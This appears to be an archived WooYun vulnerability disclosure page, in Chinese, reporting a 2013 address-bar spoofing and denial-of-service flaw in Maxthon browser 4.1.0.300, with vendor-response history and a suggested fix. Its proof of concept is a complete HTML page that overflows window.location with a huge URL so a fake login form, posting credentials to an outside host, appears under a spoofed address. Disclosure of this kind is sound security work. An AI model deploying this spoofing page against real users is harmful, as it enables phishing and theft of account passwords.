@@ -1,0 +1,220 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		遨游浏览器4.1.0.300钓鱼欺诈漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		遨游浏览器4.1.0.300钓鱼欺诈漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-07-05 09:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-10：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-09-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">利用拒绝服务给函数造成的死锁可以伪造任意网站，一种是非常卡，无限时间；还有一种不卡的，有60秒的时间可以显示伪造页面（60秒后软件的超时检测机制会替换网页内容导致失效，但是足以骗到用户的帐号密码了），见详细说明</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">浏览器执行逻辑，猜的<br />
+<br />
+1=》 打开页面之后，window.location.href变化，或者window.location.replace改变了window.location<br />
+<br />
+2=》浏览器检测到window.location变化的事件，修改地址栏为新的window.location<br />
+<br />
+3=》发送请求到新的window.location，但是window.location太长，导致dll MxResMgr.dll函数失去响应，但是主程序依旧显示出了网页内容 （2，3造成了内容欺骗）<br />
+<br />
+4=》此时发出改变window.location的请求发生阻塞，如果window.location不变化，60秒后没有监听到服务器返回的代码，另外一个函数就会显示“页面请求超时”<br />
+<br />
+5=》大约120秒后浏览器崩溃，拒绝服务 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">打开以下页面，伪造成功执行<br />
+<br />
+</p><pre><code>?&lt;html&gt;<br />
+&lt;head&gt;<br />
+  &lt;h1&gt;请在此输入你的帐号和密码&lt;/h1&gt;<br />
+  &lt;form action=&quot;http://luc.pw/test.php&quot; method=&quot;post&quot;&gt;<br />
+    username:&lt;input type=&quot;text&quot; id=&quot;u&quot;&gt;<br />
+    &lt;br/&gt;pw:&lt;input type=&quot;text&quot; id=&quot;p&quot;&gt;<br />
+    &lt;input type=&quot;submit&quot; id=&quot;s&quot;&gt;<br />
+  &lt;/form&gt;<br />
+  <br />
+&lt;script type=&quot;text/javascript&quot;&gt;<br />
+  <br />
+function mul(str,count){<br />
+    if(count==0) return &#039;&#039;;<br />
+    var binaryCount = count.toString(2);<br />
+    var numDegree = binaryCount.length;<br />
+    var resultStr=&#039;&#039;;<br />
+    for(var i=0; i&lt;numDegree; i++){<br />
+        resultStr+=resultStr;<br />
+        if(binaryCount.charAt(i) == &#039;1&#039;){<br />
+            resultStr+=str;<br />
+        }<br />
+    }<br />
+    return resultStr;<br />
+}<br />
+  <br />
+var junka = &quot;baidu.com/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;<br />
+  <br />
+var junk = mul(junka,50000);<br />
+<br />
+//function x(){<br />
+window.location.href = &quot;http://&quot; + junk;<br />
+//window.location.replace(&quot;http://&quot; + junk);<br />
+//}<br />
+<br />
+//setInterval(&quot;x()&quot;,8000);  //&lt;-这样会一直不崩溃，但是会<br />
+<br />
+//非常卡，去掉这句之后页面不卡，大约60秒的时间后出现“无法<br />
+<br />
+//连接到网站”，这应该是其他模块检测超时导致的<br />
+&lt;/script&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+  <br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0508315507bb8c56741e2bb770f799e14f81773e.jpg" target="_blank"><img src="../images/0508315507bb8c56741e2bb770f799e14f81773e.jpg" alt="abd.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">丢弃过长的请求，或者把步骤（2）放在页面加载完成之后再执行 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027808" title="遨游浏览器4.1.0.300钓鱼欺诈漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-07-10 09:18</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-08-19：已修正. 待发布.</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27808";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
